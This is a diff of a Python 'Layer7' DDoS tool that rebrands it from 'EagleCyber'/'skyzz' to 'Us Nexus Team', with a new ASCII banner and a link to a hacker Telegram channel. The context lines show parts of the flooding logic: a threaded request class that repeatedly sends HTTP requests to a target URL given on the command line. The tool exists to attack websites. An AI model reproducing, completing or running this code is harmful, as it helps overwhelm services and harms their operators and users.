@@ -1,5 +1,5 @@
 
-#This Tool Created by skyzz
+#This Tool Created by UsNexusTeam
 
 try:
     import urllib.request, os, threading, time, random, sys
@@ -41,7 +41,7 @@ class fucker(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print("[EagleCyber] Mematuk [%s]\r"%(self.url))
+        print("[USNEXUS] Mematuk [%s]\r"%(self.url))
             
     def run(self):
         global Close, Request, Tot_req
@@ -51,7 +51,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("[EagleCyber] Mematuk [%s]\r"%(self.url))
+                sys.stdout.write("[USNEXUS] Mematuk [%s]\r"%(self.url))
                 sys.exit(0)
         sys.exit(0)
 
@@ -61,13 +61,23 @@ class MainLoop():
         global Close, Request, Tot_req
         print \
 ("""
-╭╮╱╭┳━━━╮╱╱╭━╮╱╭┳━━━┳━╮╭━┳╮╱╭┳━━━╮
-┃┃╱┃┃╭━╮┃╱╱┃┃╰╮┃┃╭━━┻╮╰╯╭┫┃╱┃┃╭━╮┃
-┃┃╱┃┃╰━━╮╱╱┃╭╮╰╯┃╰━━╮╰╮╭╯┃┃╱┃┃╰━━╮
-┃┃╱┃┣━━╮┣━━┫┃╰╮┃┃╭━━╯╭╯╰╮┃┃╱┃┣━━╮┃
-┃╰━╯┃╰━╯┣━━┫┃╱┃┃┃╰━━┳╯╭╮╰┫╰━╯┃╰━╯┃
-╰━━━┻━━━╯╱╱╰╯╱╰━┻━━━┻━╯╰━┻━━━┻━━━╯↻↻
-              DDoS Tool Layer7    Us Nexus Hackers                                    
+
+██╗░░░██╗░██████╗
+██║░░░██║██╔════╝
+██║░░░██║╚█████╗░
+██║░░░██║░╚═══██╗
+╚██████╔╝██████╔╝
+░╚═════╝░╚═════╝░
+
+███╗░░██╗███████╗██╗░░██╗██╗░░░██╗░██████╗
+████╗░██║██╔════╝╚██╗██╔╝██║░░░██║██╔════╝
+██╔██╗██║█████╗░░░╚███╔╝░██║░░░██║╚█████╗░
+██║╚████║██╔══╝░░░██╔██╗░██║░░░██║░╚═══██╗
+██║░╚███║███████╗██╔╝╚██╗╚██████╔╝██████╔╝
+╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═════╝░↻↻
+              DDoS Tool Layer7 
+              The Tools Maked By Us Nexus Team
+              Telegram Link   https://t.me/usnexushacker                          
 """)
         try:
             url = sys.argv[1]
